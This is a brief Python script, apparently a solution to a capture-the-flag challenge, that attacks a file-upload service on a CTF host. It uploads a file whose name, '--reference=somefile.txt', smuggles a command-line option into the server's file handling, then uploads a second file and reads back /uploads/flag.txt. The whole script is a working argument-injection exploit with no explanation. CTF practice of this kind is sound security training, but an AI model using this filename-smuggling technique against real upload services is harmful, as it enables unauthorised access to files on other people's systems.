import httpx

url = "https://612fd534-0d54-4bfd-8bc1-deeb5e2a5b1b.x3c.tf:1337/"
resp = httpx.post(url, files={"file": ("--reference=somefile.txt", "")})
resp = httpx.post(url, files={"file": ("somefile.txt", "")})

resp = httpx.get(f"{url}/uploads/flag.txt")
print(resp.text)